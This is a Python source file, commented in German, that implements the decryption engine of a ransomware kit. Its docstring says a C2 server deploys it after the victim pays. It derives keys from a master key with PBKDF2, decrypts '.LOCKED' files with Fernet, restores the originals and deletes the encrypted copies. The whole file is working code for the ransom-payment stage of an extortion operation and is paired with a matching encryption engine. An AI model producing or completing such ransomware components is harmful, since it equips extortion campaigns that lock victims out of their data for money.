#!/usr/bin/env python3
"""
DECRYPTION ENGINE
=================
Entschlüsselt Dateien mit Master-Key
Wird nach Payment vom C2 Server deployed
"""

import os
import base64
import json
from pathlib import Path
from datetime import datetime
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2
from cryptography.hazmat.backends import default_backend

class DecryptionEngine:
    """
    AES-256 Decryption Engine
    Entschlüsselt Dateien mit Master-Key
    """
    
    def __init__(self, master_key_hex, pbkdf2_iterations=100000):
        """
        Initialisiere Decryption Engine
        
        Args:
            master_key_hex: Base64-codierter Master-Key
            pbkdf2_iterations: PBKDF2 Iterations
        """
        try:
            self.master_key = base64.b64decode(master_key_hex)
        except Exception as e:
            raise ValueError(f"Invalid master_key_hex: {e}")
        
        self.pbkdf2_iterations = pbkdf2_iterations
        self.decrypted_files = []
        self.failed_files = []
    
    def derive_key(self, salt):
        """
        Leite Decryption-Key vom Master-Key + Salt ab
        Muss mit Encryption-Engine übereinstimmen!
        """
        kdf = PBKDF2(
            algorithm=hashes.SHA256(),
            length=32,  # 256-bit
            salt=salt,
            iterations=self.pbkdf2_iterations,
            backend=default_backend()
        )
        
        key_bytes = kdf.derive(self.master_key)
        return base64.urlsafe_b64encode(key_bytes)
    
    def decrypt_file(self, encrypted_file_path, verbose=True):
        """
        Entschlüssele eine einzelne Datei
        
        Format:
          [Salt (16 bytes)] + [Encrypted Data]
        """
        try:
            encrypted_path = Path(encrypted_file_path)
            
            if not encrypted_path.exists():
                if verbose:
                    print(f"[!] File not found: {encrypted_path}")
                self.failed_files.append(str(encrypted_path))
                return False
            
            # Datei lesen
            with open(encrypted_path, 'rb') as f:
                file_data = f.read()
            
            if len(file_data) < 16:
                if verbose:
                    print(f"[!] File too small (no salt): {encrypted_path}")
                self.failed_files.append(str(encrypted_path))
                return False
            
            # Salt extrahieren (erste 16 bytes)
            salt = file_data[:16]
            encrypted_content = file_data[16:]
            
            # Key ableiten
            decryption_key = self.derive_key(salt)
            
            # Mit Fernet entschlüsseln
            cipher = Fernet(decryption_key)
            decrypted_data = cipher.decrypt(encrypted_content)
            
            # Originale Datei wiederherstellen (Suffix entfernen)
            original_path = encrypted_path
            if encrypted_path.suffix.startswith('.'):
                # Entferne letzte Datei-Endung (.LOCKED)
                original_path = Path(str(encrypted_path).rsplit('.', 1)[0])
            
            # Entschlüsselte Daten schreiben
            with open(original_path, 'wb') as f:
                f.write(decrypted_data)
            
            # Verschlüsselte Datei löschen
            os.remove(encrypted_path)
            
            # Statistik
            self.decrypted_files.append({
                'original_path': str(original_path),
                'encrypted_path': str(encrypted_path),
                'size_bytes': len(decrypted_data)
            })
            
            if verbose:
                print(f"[✓] Decrypted: {original_path.name} ({len(decrypted_data) / 1024:.1f} KB)")
            
            return True
        
        except Exception as e:
            if verbose:
                print(f"[!] Error decrypting {encrypted_file_path}: {e}")
            self.failed_files.append(str(encrypted_file_path))
            return False
    
    def decrypt_directory(self, directory, encryption_extension=".LOCKED", recursive=True, verbose=True):
        """
        Entschlüssele alle Dateien in einem Verzeichnis
        
        Args:
            directory: Verzeichnis zum scannen
            encryption_extension: Suffix der verschlüsselten Dateien
            recursive: Rekursiv in Unterverzeichnissen?
            verbose: Debug-Ausgabe?
        """
        directory = Path(directory)
        
        if not directory.exists():
            if verbose:
                print(f"[!] Directory not found: {directory}")
            return False
        
        decrypted_count = 0
        
        if recursive:
            glob_pattern = f'**/*{encryption_extension}'
        else:
            glob_pattern = f'*{encryption_extension}'
        
        for file_path in directory.glob(glob_pattern):
            if file_path.is_file():
                if self.decrypt_file(file_path, verbose):
                    decrypted_count += 1
        
        if verbose:
            print(f"\n[+] Decryption complete:")
            print(f"    Files decrypted: {decrypted_count}")
            print(f"    Failed: {len(self.failed_files)}")
        
        return decrypted_count > 0
    
    def get_status_report(self):
        """Gib Status-Report zurück"""
        return {
            'timestamp': datetime.now().isoformat(),
            'decrypted_count': len(self.decrypted_files),
            'failed_count': len(self.failed_files),
            'decrypted_files': self.decrypted_files,
            'failed_files': self.failed_files
        }
